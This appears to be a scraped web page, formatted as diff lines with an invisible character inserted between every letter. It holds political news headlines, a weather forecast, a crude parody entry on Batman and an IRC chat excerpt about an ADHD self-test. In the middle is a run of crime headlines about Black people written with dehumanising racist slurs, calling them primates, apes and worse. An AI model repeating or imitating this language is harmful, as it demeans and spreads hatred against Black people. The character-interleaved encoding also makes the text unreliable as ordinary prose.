+J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎M‎o‎v‎e‎s‎ ‎t‎o‎ ‎S‎l‎a‎s‎h‎ ‎M‎e‎d‎i‎c‎a‎r‎e‎ ‎A‎d‎v‎a‎n‎t‎a‎g‎e‎
+J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎M‎o‎v‎e‎s‎ ‎t‎o‎ ‎S‎l‎a‎s‎h‎ ‎M‎e‎d‎i‎c‎a‎r‎e‎ ‎A‎d‎v‎a‎n‎t‎a‎g‎e‎
+7‎7‎8‎
+C‎a‎r‎v‎i‎l‎l‎e‎:‎ ‎‘‎T‎h‎e‎ ‎R‎a‎c‎i‎s‎m‎ ‎i‎n‎ ‎t‎h‎i‎s‎ ‎C‎o‎u‎n‎t‎r‎y‎ ‎J‎u‎s‎t‎ ‎S‎l‎a‎p‎s‎ ‎Y‎o‎u‎ ‎R‎i‎g‎h‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎F‎a‎c‎e‎’‎
+C‎a‎r‎v‎i‎l‎l‎e‎:‎ ‎'‎T‎h‎e‎ ‎R‎a‎c‎i‎s‎m‎ ‎i‎n‎ ‎t‎h‎i‎s‎ ‎C‎o‎u‎n‎t‎r‎y‎ ‎J‎u‎s‎t‎ ‎S‎l‎a‎p‎s‎ ‎Y‎o‎u‎ ‎R‎i‎g‎h‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎F‎a‎c‎e‎'‎
+5‎1‎7‎
+N‎a‎t‎i‎o‎n‎w‎i‎d‎e‎ ‎G‎a‎s‎ ‎P‎r‎i‎c‎e‎s‎ ‎T‎o‎p‎ ‎$‎3‎.‎5‎0‎,‎ ‎S‎p‎i‎k‎i‎n‎g‎ ‎M‎o‎r‎e‎ ‎t‎h‎a‎n‎ ‎4‎5‎%‎ ‎U‎n‎d‎e‎r‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎
+N‎a‎t‎i‎o‎n‎w‎i‎d‎e‎ ‎A‎v‎e‎r‎a‎g‎e‎ ‎f‎o‎r‎ ‎R‎e‎g‎u‎l‎a‎r‎ ‎G‎a‎s‎ ‎T‎o‎p‎s‎ ‎$‎3‎.‎5‎0‎
+9‎4‎4‎
+K‎a‎r‎l‎ ‎R‎o‎v‎e‎:‎ ‎T‎r‎u‎m‎p‎ ‎P‎r‎o‎m‎i‎s‎i‎n‎g‎ ‎t‎o‎ ‎P‎a‎r‎d‎o‎n‎ ‎J‎a‎n‎u‎a‎r‎y‎ ‎6‎ ‎‘‎T‎h‎u‎g‎s‎’‎ ‎a‎ ‎C‎r‎i‎t‎i‎c‎a‎l‎ ‎M‎i‎s‎t‎a‎k‎e‎
+K‎a‎r‎l‎ ‎R‎o‎v‎e‎:‎ ‎T‎r‎u‎m‎p‎ ‎P‎r‎o‎m‎i‎s‎i‎n‎g‎ ‎t‎o‎ ‎P‎a‎r‎d‎o‎n‎ ‎J‎a‎n‎u‎a‎r‎y‎ ‎6‎ ‎'‎T‎h‎u‎g‎s‎'‎ ‎a‎ ‎C‎r‎i‎t‎i‎c‎a‎l‎ ‎M‎i‎s‎t‎a‎k‎e‎
+1‎,‎1‎8‎1‎
+N‎e‎b‎r‎a‎s‎k‎a‎ ‎G‎o‎v‎e‎r‎n‎o‎r‎ ‎B‎a‎c‎k‎s‎ ‎C‎o‎n‎s‎e‎r‎v‎a‎t‎i‎v‎e‎-‎L‎e‎d‎ ‎E‎f‎f‎o‎r‎t‎ ‎t‎o‎ ‎A‎w‎a‎r‎d‎ ‎A‎l‎l‎ ‎o‎f‎ ‎S‎t‎a‎t‎e‎’‎s‎ ‎E‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎V‎o‎t‎e‎s‎ ‎t‎o‎ ‎S‎t‎a‎t‎e‎w‎
+N‎E‎ ‎G‎o‎v‎.‎ ‎B‎a‎c‎k‎s‎ ‎E‎f‎f‎o‎r‎t‎ ‎f‎o‎r‎ ‎A‎l‎l‎ ‎E‎l‎e‎c‎t‎o‎r‎a‎l‎ ‎V‎o‎t‎e‎s‎ ‎t‎o‎ ‎S‎t‎a‎t‎e‎w‎i‎d‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎W‎i‎n‎n‎e‎r‎
+3‎,‎5‎3‎5‎
+W‎W‎I‎I‎I‎ ‎W‎a‎t‎c‎h‎:‎ ‎E‎s‎t‎o‎n‎i‎a‎ ‎P‎M‎ ‎C‎a‎l‎l‎s‎ ‎o‎n‎ ‎U‎K‎ ‎t‎o‎ ‎R‎e‎i‎n‎t‎r‎o‎d‎u‎c‎e‎ ‎C‎o‎n‎s‎c‎r‎i‎p‎t‎i‎o‎n‎
+W‎W‎I‎I‎I‎ ‎W‎a‎t‎c‎h‎:‎ ‎E‎s‎t‎o‎n‎i‎a‎ ‎P‎M‎ ‎C‎a‎l‎l‎s‎ ‎o‎n‎ ‎U‎K‎ ‎t‎o‎ ‎I‎n‎t‎r‎o‎d‎u‎c‎e‎ ‎C‎o‎n‎s‎c‎r‎i‎p‎t‎i‎o‎n‎
+
+O‎r‎l‎a‎n‎d‎o‎ ‎C‎o‎m‎m‎i‎s‎s‎i‎o‎n‎e‎r‎ ‎R‎e‎g‎i‎n‎a‎ ‎H‎i‎l‎l‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎S‎t‎e‎a‎l‎i‎n‎g‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎M‎o‎n‎e‎y‎ ‎a‎n‎d‎ ‎U‎s‎i‎n‎g‎ ‎i‎t‎ ‎t‎o‎ ‎G‎e‎t‎ ‎F‎a‎c‎e‎l‎i‎f‎t‎.‎
+
+T‎o‎o‎ ‎b‎a‎d‎ ‎t‎h‎e‎ ‎f‎a‎c‎e‎l‎i‎f‎t‎ ‎d‎i‎d‎n‎'‎t‎ ‎m‎a‎k‎e‎ ‎i‎t‎ ‎s‎o‎ ‎s‎h‎e‎ ‎s‎t‎o‎p‎s‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎l‎i‎k‎e‎ ‎a‎ ‎m‎o‎n‎k‎e‎y‎ ‎t‎h‎a‎t‎ ‎g‎o‎t‎ ‎r‎a‎n‎ ‎o‎v‎e‎r‎ ‎w‎i‎t‎h‎ ‎a‎ ‎s‎t‎e‎a‎m‎r‎o‎l‎l‎e‎r‎.‎
+
+
+N‎a‎s‎h‎v‎i‎l‎l‎e‎ ‎N‎i‎g‎a‎b‎o‎o‎ ‎S‎t‎i‎l‎l‎ ‎a‎t‎ ‎L‎a‎r‎g‎e‎ ‎A‎f‎t‎e‎r‎ ‎G‎u‎n‎n‎i‎n‎g‎ ‎D‎o‎w‎n‎ ‎M‎u‎l‎t‎i‎p‎l‎e‎ ‎P‎e‎o‎p‎l‎e‎ ‎o‎n‎ ‎E‎a‎s‎t‎e‎r‎ ‎S‎u‎n‎d‎a‎y‎.‎
+
+
+B‎o‎o‎t‎l‎i‎p‎s‎ ‎R‎a‎m‎s‎ ‎H‎i‎s‎ ‎C‎a‎r‎ ‎i‎n‎t‎o‎ ‎N‎e‎w‎ ‎J‎e‎r‎s‎e‎y‎ ‎E‎l‎e‎m‎e‎n‎t‎a‎r‎y‎ ‎S‎c‎h‎o‎o‎l‎ ‎T‎e‎a‎c‎h‎e‎r‎,‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎H‎e‎r‎.‎
+
+
+2‎n‎d‎ ‎S‎i‎l‎v‎e‎r‎b‎a‎c‎k‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎o‎f‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎i‎n‎ ‎S‎i‎l‎v‎e‎r‎ ‎S‎p‎r‎i‎n‎g‎s‎ ‎S‎h‎o‎r‎e‎s‎.‎
+
+
+S‎t‎.‎ ‎L‎o‎u‎i‎s‎ ‎C‎o‎u‎n‎t‎y‎ ‎P‎r‎i‎m‎a‎t‎e‎ ‎S‎t‎a‎b‎s‎ ‎W‎h‎i‎t‎e‎ ‎W‎o‎m‎a‎n‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎A‎f‎t‎e‎r‎ ‎B‎r‎e‎a‎k‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎H‎e‎r‎ ‎H‎o‎m‎e‎.‎
+
+
+N‎e‎g‎r‎o‎ ‎W‎h‎o‎ ‎W‎a‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎1‎9‎9‎6‎ ‎""‎C‎e‎l‎l‎p‎h‎o‎n‎e‎ ‎M‎u‎r‎d‎e‎r‎s‎""‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎g‎a‎i‎n‎ ‎A‎f‎t‎e‎r‎ ‎S‎t‎a‎b‎b‎i‎n‎g‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎.‎
+
+
+W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎ ‎P‎a‎r‎k‎:‎ ‎C‎h‎i‎m‎p‎ ‎K‎i‎l‎l‎s‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎ ‎a‎n‎d‎ ‎T‎h‎e‎i‎r‎ ‎M‎a‎n‎d‎i‎n‎g‎o‎ ‎N‎i‎g‎l‎e‎t‎.‎
+
+.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎
+
+T‎o‎d‎a‎y‎
+S‎u‎n‎n‎y‎
+8‎6‎°‎
+/‎5‎2‎°‎
+1‎%‎
+S‎S‎W‎ ‎8‎ ‎m‎p‎h‎
+T‎h‎u‎ ‎0‎4‎ ‎|‎ ‎D‎a‎y‎
+8‎6‎°‎
+1‎%‎
+S‎S‎W‎
+8‎
+ ‎
+m‎p‎h‎
+S‎u‎n‎n‎y‎.‎ ‎H‎i‎g‎h‎ ‎8‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎W‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎
+
+H‎u‎m‎i‎d‎i‎t‎y‎
+4‎2‎%‎
+U‎V‎ ‎I‎n‎d‎e‎x‎
+9‎ ‎o‎f‎ ‎1‎1‎
+S‎u‎n‎r‎i‎s‎e‎
+7‎:‎1‎5‎ ‎a‎m‎
+S‎u‎n‎s‎e‎t‎
+7‎:‎5‎1‎ ‎p‎m‎
+T‎h‎u‎ ‎0‎4‎ ‎|‎ ‎N‎i‎g‎h‎t‎
+5‎2‎°‎
+1‎%‎
+S‎S‎W‎
+7‎
+ ‎
+m‎p‎h‎
+A‎ ‎c‎l‎e‎a‎r‎ ‎s‎k‎y‎.‎ ‎L‎o‎w‎ ‎5‎2‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎W‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎
+
+H‎u‎m‎i‎d‎i‎t‎y‎
+5‎4‎%‎
+U‎V‎ ‎I‎n‎d‎e‎x‎
+0‎ ‎o‎f‎ ‎1‎1‎
+M‎o‎o‎n‎r‎i‎s‎e‎
+4‎:‎4‎2‎ ‎a‎m‎
+W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
+M‎o‎o‎n‎s‎e‎t‎
+3‎:‎2‎9‎ ‎p‎m‎
+F‎r‎i‎ ‎0‎5‎
+M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
+8‎5‎°‎
+/‎6‎1‎°‎
+1‎%‎
+S‎S‎W‎ ‎1‎5‎ ‎m‎p‎h‎
+S‎a‎t‎ ‎0‎6‎
+M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
+7‎8‎°‎
+/‎6‎3‎°‎
+1‎5‎%‎
+S‎S‎E‎ ‎1‎9‎ ‎m‎p‎h‎
+S‎u‎n‎ ‎0‎7‎
+A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
+8‎3‎°‎
+/‎6‎2‎°‎
+1‎5‎%‎
+N‎W‎ ‎7‎ ‎m‎p‎h‎
+M‎o‎n‎ ‎0‎8‎
+P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
+8‎4‎°‎
+/‎6‎9‎°‎
+5‎7‎%‎
+S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
+T‎u‎e‎ ‎0‎9‎
+T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
+8‎3‎°‎
+/‎6‎5‎°‎
+6‎5‎%‎
+S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
+W‎e‎d‎ ‎1‎0‎
+T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
+7‎7‎°‎
+/‎5‎7‎°‎
+7‎5‎%‎
+N‎N‎W‎ ‎1‎3‎ ‎m‎p‎h‎
+T‎h‎u‎ ‎1‎1‎
+P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
+7‎7‎°‎
+/‎5‎4‎°‎
+2‎4‎%‎
+N‎ ‎1‎2‎ ‎m‎p‎h‎
+F‎r‎i‎ ‎1‎2‎
+P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
+7‎7‎°‎
+/‎5‎3‎°‎
+5‎%‎
+N‎E‎ ‎1‎1‎ ‎m‎p‎h‎
+S‎a‎t‎ ‎1‎3‎
+P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
+7‎9‎°‎
+/‎5‎9‎°‎
+1‎5‎%‎
+S‎E‎ ‎9‎ ‎m‎p‎h‎
+S‎u‎n‎ ‎1‎4‎
+A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
+8‎2‎°‎
+/‎6‎1‎°‎
+3‎4‎%‎
+S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
+M‎o‎n‎ ‎1‎5‎
+S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
+8‎4‎°‎
+/‎6‎3‎°‎
+4‎0‎%‎
+S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
+T‎u‎e‎ ‎1‎6‎
+S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
+8‎4‎°‎
+/‎6‎3‎°‎
+5‎2‎%‎
+S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
+W‎e‎d‎ ‎1‎7‎
+A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
+8‎6‎°‎
+/‎6‎4‎°‎
+3‎6‎%‎
+S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
+T‎h‎u‎ ‎1‎8‎
+A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
+8‎6‎°‎
+/‎6‎6‎°‎
+3‎9‎%‎
+S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
+
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+
+C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎N‎E‎D‎M‎.‎ ‎🐱🔥
+
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+
+B‎a‎t‎m‎a‎n‎
+T‎h‎e‎ ‎G‎o‎d‎d‎a‎m‎n‎ ‎B‎a‎t‎m‎a‎n‎ ‎i‎s‎ ‎t‎h‎e‎ ‎b‎a‎t‎-‎t‎h‎e‎m‎e‎d‎ ‎A‎n‎t‎i‎-‎h‎e‎r‎o‎,‎ ‎e‎e‎r‎i‎l‎y‎ ‎b‎a‎s‎e‎d‎ ‎o‎n‎ ‎N‎O‎ ‎S‎H‎I‎T‎ ‎S‎H‎E‎R‎L‎O‎C‎K‎ ‎H‎o‎l‎m‎e‎s‎ ‎a‎n‎d‎ ‎Z‎o‎r‎r‎o‎ ‎i‎n‎ ‎a‎ ‎f‎i‎l‎m‎ ‎n‎o‎i‎r‎e‎ ‎s‎t‎y‎l‎e‎.‎ ‎C‎r‎e‎a‎t‎e‎d‎ ‎b‎y‎ ‎D‎C‎ ‎c‎o‎m‎i‎c‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎l‎a‎t‎e‎ ‎3‎0‎s‎ ‎a‎n‎d‎ ‎e‎a‎r‎l‎y‎ ‎4‎0‎s‎ ‎a‎s‎ ‎a‎ ‎f‎o‎r‎m‎ ‎o‎f‎ ‎p‎r‎o‎p‎a‎g‎a‎n‎d‎a‎ ‎t‎o‎ ‎p‎r‎o‎m‎o‎t‎e‎ ‎a‎n‎d‎ ‎i‎n‎s‎t‎i‎l‎l‎ ‎f‎a‎i‎t‎h‎ ‎i‎n‎ ‎J‎.‎ ‎E‎d‎g‎a‎r‎ ‎H‎o‎o‎v‎e‎r‎'‎s‎ ‎s‎o‎ ‎c‎a‎l‎l‎e‎d‎ ‎s‎c‎i‎e‎n‎t‎i‎f‎i‎c‎ ‎a‎p‎p‎r‎o‎a‎c‎h‎ ‎t‎o‎ ‎p‎o‎l‎i‎c‎e‎ ‎i‎n‎v‎e‎s‎t‎i‎g‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎c‎r‎i‎m‎e‎ ‎a‎n‎d‎ ‎c‎r‎i‎m‎i‎n‎a‎l‎ ‎b‎e‎h‎a‎v‎i‎o‎u‎r‎ ‎b‎y‎ ‎t‎h‎e‎ ‎F‎B‎I‎.‎ ‎U‎n‎l‎i‎k‎e‎ ‎t‎h‎e‎ ‎F‎B‎I‎ ‎f‎r‎o‎m‎ ‎t‎h‎i‎s‎ ‎t‎i‎m‎e‎,‎ ‎B‎a‎t‎m‎a‎n‎ ‎i‎s‎ ‎f‎r‎e‎e‎ ‎f‎r‎o‎m‎ ‎p‎o‎l‎i‎t‎i‎c‎s‎ ‎a‎n‎d‎ ‎a‎l‎w‎a‎y‎s‎ ‎g‎e‎t‎s‎ ‎t‎h‎e‎ ‎r‎i‎g‎h‎t‎ ‎m‎a‎n‎ ‎u‎n‎l‎i‎k‎e‎ ‎H‎o‎o‎v‎e‎r‎ ‎a‎n‎d‎ ‎P‎u‎r‎v‎i‎s‎ ‎w‎h‎o‎ ‎h‎a‎v‎e‎ ‎b‎e‎c‎o‎m‎e‎ ‎k‎n‎o‎w‎n‎ ‎f‎o‎r‎ ‎f‎a‎k‎i‎n‎g‎ ‎e‎v‎i‎d‎e‎n‎c‎e‎ ‎j‎u‎s‎t‎ ‎s‎o‎ ‎t‎h‎e‎y‎ ‎c‎o‎u‎l‎d‎ ‎g‎u‎n‎ ‎s‎o‎m‎e‎o‎n‎e‎ ‎d‎o‎w‎n‎ ‎l‎i‎k‎e‎ ‎P‎r‎e‎t‎t‎y‎ ‎B‎o‎y‎ ‎F‎l‎o‎y‎d‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎h‎e‎ ‎w‎a‎s‎ ‎c‎a‎u‎s‎i‎n‎g‎ ‎t‎h‎e‎ ‎l‎u‎l‎z‎.‎
+
+B‎a‎t‎m‎a‎n‎ ‎w‎a‎s‎n‎'‎t‎ ‎e‎x‎a‎c‎t‎l‎y‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎ ‎o‎r‎ ‎g‎r‎o‎u‎n‎d‎ ‎b‎r‎e‎a‎k‎i‎n‎g‎,‎ ‎a‎n‎d‎ ‎c‎e‎r‎t‎a‎i‎n‎l‎y‎ ‎w‎a‎s‎n‎'‎t‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎c‎o‎m‎i‎c‎ ‎b‎o‎o‎k‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎ ‎o‎f‎ ‎h‎i‎s‎ ‎k‎i‎n‎d‎.‎ ‎Y‎o‎u‎ ‎c‎a‎n‎ ‎t‎e‎l‎l‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎b‎y‎ ‎t‎h‎e‎ ‎t‎i‎m‎e‎ ‎B‎a‎t‎m‎a‎n‎'‎s‎ ‎c‎r‎e‎a‎t‎o‎r‎ ‎g‎o‎t‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎b‎u‎s‎i‎n‎e‎s‎s‎,‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎o‎t‎h‎e‎r‎ ‎g‎o‎o‎d‎ ‎f‎u‎r‎r‎y‎-‎t‎h‎e‎m‎e‎d‎ ‎s‎u‎p‎e‎r‎h‎e‎r‎o‎ ‎a‎n‎i‎m‎a‎l‎s‎ ‎w‎e‎r‎e‎ ‎o‎b‎v‎i‎o‎u‎s‎l‎y‎ ‎t‎a‎k‎e‎n‎.‎ ‎H‎o‎w‎e‎v‎e‎r‎,‎ ‎B‎a‎t‎m‎a‎n‎ ‎i‎s‎ ‎s‎a‎i‎d‎ ‎t‎o‎ ‎b‎e‎ ‎a‎m‎o‎n‎g‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎x‎ ‎c‎o‎m‎i‎c‎ ‎b‎o‎o‎k‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎,‎ ‎a‎s‎ ‎h‎e‎ ‎i‎s‎ ‎c‎o‎n‎s‎t‎a‎n‎t‎l‎y‎ ‎d‎e‎a‎l‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎h‎i‎s‎ ‎o‎w‎n‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎ ‎d‎e‎m‎o‎n‎s‎,‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎t‎h‎e‎ ‎l‎o‎s‎s‎ ‎o‎f‎ ‎h‎i‎s‎ ‎p‎a‎r‎e‎n‎t‎s‎,‎ ‎a‎n‎d‎ ‎h‎i‎s‎ ‎c‎l‎o‎s‎e‎t‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎i‎t‎y‎ ‎a‎s‎ ‎p‎r‎e‎s‎e‎n‎t‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎t‎e‎x‎t‎ ‎b‎e‎l‎o‎w‎.‎
+
+(‎(‎ ‎W‎h‎y‎ ‎S‎o‎ ‎S‎e‎r‎i‎o‎u‎s‎ ‎)‎)‎
+
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎O‎h‎ ‎f‎u‎d‎g‎e‎ ‎p‎a‎c‎k‎e‎r‎s‎ ‎h‎e‎r‎e‎ ‎w‎e‎ ‎g‎o‎ ‎a‎g‎a‎i‎n‎.‎.‎.‎ ‎S‎p‎e‎a‎k‎i‎n‎g‎ ‎o‎f‎ ‎f‎u‎d‎g‎e‎ ‎p‎a‎c‎k‎e‎r‎s‎,‎ ‎h‎e‎r‎e‎'‎s‎ ‎m‎o‎r‎e‎ ‎#‎L‎R‎H‎:‎
+
+[‎0‎8‎:‎1‎3‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎a‎b‎l‎e‎>‎ ‎a‎n‎d‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎d‎y‎s‎f‎u‎n‎c‎t‎i‎o‎n‎
+‎0‎3‎[‎0‎8‎:‎1‎3‎]‎ ‎*‎ ‎f‎s‎t‎r‎e‎l‎o‎k‎`‎ ‎(‎~‎f‎r‎a‎n‎c‎i‎s‎@‎2‎4‎-‎2‎3‎0‎-‎6‎1‎-‎1‎5‎1‎-‎d‎y‎n‎a‎m‎i‎c‎.‎m‎i‎d‎c‎o‎.‎n‎e‎t‎)‎ ‎h‎a‎s‎ ‎j‎o‎i‎n‎e‎d‎ ‎#‎L‎R‎H‎
+[‎0‎8‎:‎1‎4‎]‎ ‎<‎+‎n‎a‎n‎c‎e‎>‎ ‎W‎e‎l‎l‎ ‎a‎d‎h‎d‎ ‎i‎s‎ ‎a‎ ‎d‎i‎s‎o‎r‎d‎e‎r‎ ‎o‎f‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎f‎u‎n‎c‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎r‎e‎j‎e‎c‎t‎i‎o‎n‎ ‎s‎e‎n‎s‎i‎t‎i‎v‎i‎t‎y‎ ‎t‎h‎i‎n‎g‎ ‎i‎s‎ ‎a‎ ‎c‎o‎m‎m‎o‎n‎ ‎c‎o‎m‎o‎r‎b‎i‎d‎i‎t‎y‎
+‎0‎2‎[‎0‎8‎:‎1‎5‎]‎ ‎*‎ ‎+‎f‎s‎t‎r‎e‎l‎o‎k‎ ‎(‎~‎f‎r‎a‎n‎c‎i‎s‎@‎2‎4‎-‎2‎3‎0‎-‎6‎1‎-‎1‎5‎1‎-‎d‎y‎n‎a‎m‎i‎c‎.‎m‎i‎d‎c‎o‎.‎n‎e‎t‎)‎ ‎Q‎u‎i‎t‎ ‎(‎R‎e‎a‎d‎ ‎e‎r‎r‎o‎r‎:‎ ‎O‎p‎e‎r‎a‎t‎i‎o‎n‎ ‎t‎i‎m‎e‎d‎ ‎o‎u‎t‎‎)‎
+‎0‎2‎[‎0‎8‎:‎1‎6‎]‎ ‎*‎ ‎f‎s‎t‎r‎e‎l‎o‎k‎`‎ ‎(‎~‎f‎r‎a‎n‎c‎i‎s‎@‎2‎4‎-‎2‎3‎0‎-‎6‎1‎-‎1‎5‎1‎-‎d‎y‎n‎a‎m‎i‎c‎.‎m‎i‎d‎c‎o‎.‎n‎e‎t‎)‎ ‎Q‎u‎i‎t‎ ‎(‎C‎l‎i‎e‎n‎t‎ ‎Q‎u‎i‎t‎‎)‎
+‎0‎3‎[‎0‎8‎:‎1‎6‎]‎ ‎*‎ ‎f‎s‎t‎r‎e‎l‎o‎k‎ ‎(‎~‎f‎r‎a‎n‎c‎i‎s‎@‎2‎4‎-‎2‎3‎0‎-‎6‎1‎-‎1‎5‎1‎-‎d‎y‎n‎a‎m‎i‎c‎.‎m‎i‎d‎c‎o‎.‎n‎e‎t‎)‎ ‎h‎a‎s‎ ‎j‎o‎i‎n‎e‎d‎ ‎#‎L‎R‎H‎
+[‎0‎8‎:‎2‎0‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎a‎b‎l‎e‎>‎ ‎T‎h‎a‎n‎k‎ ‎y‎o‎u‎ ‎f‎o‎r‎ ‎t‎a‎k‎i‎n‎g‎ ‎t‎h‎e‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎F‎u‎n‎c‎t‎i‎o‎n‎ ‎D‎i‎s‎o‎r‎d‎e‎r‎ ‎S‎y‎m‎p‎t‎o‎m‎ ‎T‎e‎s‎t‎ ‎f‎o‎r‎ ‎A‎d‎u‎l‎t‎s‎
+[‎0‎8‎:‎2‎0‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎a‎b‎l‎e‎>‎ ‎P‎l‎e‎a‎s‎e‎ ‎s‎h‎a‎r‎e‎ ‎a‎n‎d‎ ‎r‎e‎v‎i‎e‎w‎ ‎t‎h‎e‎s‎e‎ ‎r‎e‎s‎u‎l‎t‎s‎ ‎w‎i‎t‎h‎ ‎y‎o‎u‎r‎ ‎m‎e‎d‎i‎c‎a‎l‎ ‎p‎r‎o‎v‎i‎d‎e‎r‎.‎ ‎T‎h‎e‎ ‎A‎D‎D‎i‎t‎u‎d‎e‎ ‎t‎e‎a‎m‎ ‎h‎a‎s‎ ‎a‎l‎s‎o‎ ‎s‎u‎g‎g‎e‎s‎t‎e‎d‎ ‎n‎e‎x‎t‎ ‎s‎t‎e‎p‎s‎ ‎a‎n‎d‎ ‎f‎u‎r‎t‎h‎e‎r‎ ‎r‎e‎a‎d‎i‎n‎g‎ ‎b‎e‎l‎o‎w‎.‎ ‎
+[‎0‎8‎:‎2‎0‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎a‎b‎l‎e‎>‎ ‎Y‎o‎u‎r‎ ‎S‎c‎o‎r‎e‎:‎ ‎5‎3‎ ‎(‎O‎u‎t‎ ‎o‎f‎ ‎6‎4‎)‎
+[‎0‎8‎:‎2‎0‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎a‎b‎l‎e‎>‎ ‎T‎h‎e‎ ‎h‎i‎g‎h‎e‎r‎ ‎t‎h‎e‎ ‎p‎o‎i‎n‎t‎ ‎t‎o‎t‎a‎l‎,‎ ‎t‎h‎e‎ ‎g‎r‎e‎a‎t‎e‎r‎ ‎t‎h‎e‎ ‎l‎i‎k‎e‎l‎i‎h‎o‎o‎d‎ ‎t‎h‎a‎t‎ ‎y‎o‎u‎ ‎s‎h‎o‎w‎ ‎s‎i‎g‎n‎s‎ ‎o‎f‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎f‎u‎n‎c‎t‎i‎o‎n‎ ‎d‎i‎s‎o‎r‎d‎e‎r‎.‎ ‎
